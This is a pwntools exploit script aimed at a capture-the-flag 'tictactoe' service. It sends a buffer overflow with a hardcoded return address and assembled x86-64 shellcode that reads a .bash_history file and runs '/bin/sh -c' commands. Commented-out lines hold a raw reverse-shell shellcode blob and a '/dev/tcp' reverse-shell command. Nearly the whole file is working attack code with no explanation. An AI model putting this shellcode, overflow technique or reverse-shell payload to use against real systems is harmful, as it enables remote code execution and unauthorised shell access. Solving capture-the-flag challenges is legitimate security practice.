from pwn import *
io=remote("pwn-tictactoe.ctfz.one", 8889)
#io=remote("localhost",8889)

#shell="""H1\xc0H1\xffH1\xf6H1\xd2M1\xc0j\x02_j\x01^j\x06Zj)X\x0f\x05I\x89\xc0H1\xf6M1\xd2AR\xc6\x04$\x02f\xc7D$\x02zi\xc7D$\x04\rR\xdc\x81H\x89\xe6j\x10ZAP_j*X\x0f\x05H1\xf6j\x03^H\xff\xcej!X\x0f\x05u\xf6H1\xffWW^ZH\xbf//bin/shH\xc1\xef\x08WT_j;X\x0f\x05"""

addr=0x405770
context.arch='amd64'
context.bits=64

junk = asm("""
           add rsp, 0x8
           push rsp
           ret
""")

shellcode=asm("""
              xor rax,rax
              mov rax,59
              lea rdi,[rsp+0x108]
              mov rsi,0x4057f0
              mov r10,rsp
              mov rsp,rsi
              xor r11,r11
              add  r11, 0x110
              add r11, r10
              push r11
              mov r11, 0x108
              add r11,r10
              push r11
              mov r11,0x100
              add r11,r10
              push r11
              add rsp,0x100
              mov rsi,0x4057d8
              mov rdx,0
              sub rdi,0x8

jmp shell


shellcode:
mov    rax,0x2
pop    rdi
xor    rsi,rsi
xor    rdx,rdx
syscall
xor    rdi,rdi
mov    rdi,rax
xor    rax,rax
mov    rsi,0x405fa0
mov    rdx,0x100
syscall
xor    rdi,rdi
mov    rdi,0x4
xor    rsi,rsi
mov    rsi,0x405fa0
xor    rdx,rdx
mov    rdx,0x100
xor    rcx,rcx
xor    rax,rax
mov    rax,0x4
xor    rbx,rbx
mov    rbx,0x4010c0
push   rbx
ret

shell:
 call   shellcode
"""
)#.ljust(0x100,"\x90")
shellcode=(shellcode+"/tictactoe/.bash_history\x00").ljust(0x100,"\x90")

payload="/bin/sh\x00"+"-c".ljust(8,"\x00")+"echo /* > /tmp/file".ljust(24,"\x00")
#payload="/bin/sh\x00"+"-c".ljust(8,"\x00")+"ls".ljust(24,"\x00")

#payload="/bin/sh\x00"+"-c".ljust(8,"\x00")+"sh -i >& /dev/tcp/127.0.0.1/8888 0>&1"
junk =(junk).ljust(0x58,"\x90")



#io.sendlineafter("e, enter your name: ",junk+p64(addr)+"a"*8+shell)
io.sendlineafter("e, enter your name: ",junk+p64(addr)+"a"*8+shellcode+payload)


#f=open("libc","w")
#f.write(junk+p64(addr)+"a"*8+shellcode+payload)
#print io.recv(0x200)

io.interactive()
